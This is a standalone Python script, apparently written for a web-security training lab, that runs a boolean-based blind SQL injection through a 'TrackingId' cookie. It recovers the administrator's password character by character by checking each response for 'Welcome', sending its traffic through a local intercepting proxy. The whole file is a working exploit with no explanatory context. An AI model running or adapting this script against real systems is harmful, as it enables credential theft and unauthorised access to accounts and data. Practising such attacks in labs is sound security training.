
import sys
import httpx
import urllib.parse


proxies = "http://127.0.0.1:8080"


def sqli_password(url):
    password_extracted = ""

    with httpx.Client(
        http2=True,
        verify=False,
        proxy=proxies
    ) as client:

        for i in range(1, 21):
            for j in range(32, 126):

                sqli_payload = (
                    "' and (select ascii(substring(password,%s,1)) "
                    "from users where username='administrator')='%s'--"
                    % (i, j)
                )

                sqli_payload_encoded = urllib.parse.quote(sqli_payload)

                cookies = {
                    "TrackingId": "YOUR_TRACKING_ID" + sqli_payload_encoded,
                    "session": "YOUR_SESSION_COOKIE"
                }

                r = client.get(
                    url,
                    cookies=cookies
                )

                if "Welcome" not in r.text:
                    sys.stdout.write(
                        "\r" + password_extracted + chr(j)
                    )
                    sys.stdout.flush()

                else:
                    password_extracted += chr(j)

                    sys.stdout.write(
                        "\r" + password_extracted
                    )
                    sys.stdout.flush()

                    break

    print()
    print("(+) Password extraction complete.")
    print("(+) Administrator password:", password_extracted)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://example.com/" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]

    print("(+) Retrieving administrator password...")

    sqli_password(url)


if __name__ == "__main__":
    main()

